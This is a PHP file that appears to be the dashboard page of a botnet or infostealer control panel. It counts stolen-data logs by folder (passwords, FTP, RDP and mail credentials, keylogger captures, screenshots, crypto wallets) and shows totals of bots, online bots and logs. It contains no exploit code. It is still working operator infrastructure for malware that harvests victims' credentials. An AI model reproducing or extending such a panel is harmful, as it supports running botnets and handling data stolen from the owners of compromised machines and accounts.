<?php
session_start();

require_once('inc/session.php');
require_once('inc/html_grund.php');
include('inc/counts.php');
include('inc/cron.php');

$logpos = count(glob("logs/dump/{*.log}", GLOB_BRACE));
$logsc  = count(glob("logs/scr/{*.jpg}", GLOB_BRACE));
$logpw  = count(glob("logs/pass/{*.LOG}", GLOB_BRACE));
$logft  = count(glob("logs/ftp/{*.txt}", GLOB_BRACE));
$logrp  = count(glob("logs/rdp/{*.TXT}", GLOB_BRACE));
$logml  = count(glob("logs/mail/{*.TxT}", GLOB_BRACE));
$logky  = count(glob("logs/kyl/{*.html}", GLOB_BRACE));
$logwl  = count(glob("logs/wallet/{*.wallet}", GLOB_BRACE));

$logtotal = $logpos + $logsc + $logpw + $logft + $logrp + $logml + $logky + $logwl;


echo '<link rel="stylesheet" href="css/home.css"/>

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#nav\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>


<div id="acontent"> 
    <div id="abody"> 
       <div id="aleft">        
       <span><b>Total Bots:</b></span>      
       <center><span class="blue">' . $totalbots . '</span></center>
       </div> 
       <div id="aright"> 
       <span><b>Total Logs:</b></span>       
       <center><span class="pink">' . $logtotal . '</span></center>
       </div> 
       <div id="acenter"> 
       <center><span><b>Online Bots:</b></span></center>       
       <center><span class="green">' . $online . '</span></center>
            <br>
            <center><img src="img/logo.png"></center>
       </div> 
    </div> 
</div>';

require_once('inc/html_footer.php');
?>